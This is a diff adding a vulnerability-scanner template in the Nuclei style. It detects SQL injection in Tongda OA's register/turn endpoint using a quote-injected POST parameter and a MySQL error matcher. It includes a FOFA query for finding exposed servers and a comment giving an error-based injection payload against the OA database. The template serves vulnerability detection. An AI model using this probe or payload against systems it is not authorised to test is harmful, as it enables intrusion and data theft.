@@ -1,0 +1,29 @@
+id: tongda-oa-register-turn-sqli
+
+info:
+  name: 通达OA register/turn SQL注入
+  author: pphua
+  severity: high
+  tags: tongda,oa,sqli
+  metadata:
+    fofa-query: title="office Anywhere" && icon_hash="-759108386" && "2013"
+    max-request: 1
+    veified: true
+
+
+http:
+  - raw:
+      - |
+        POST /general/document/index.php/recv/register/turn HTTP/1.1
+        User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _SERVER=&rid=1'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains((body_1), 'You have an error in your SQL syntax')"
+
+# rid=EXP(~(SELECT*FROM(SELECT md5(1) FROM INFORMATION_SCHEMA.tables where table_schema=0x74645F6F61 LIMIT 1,1)a))
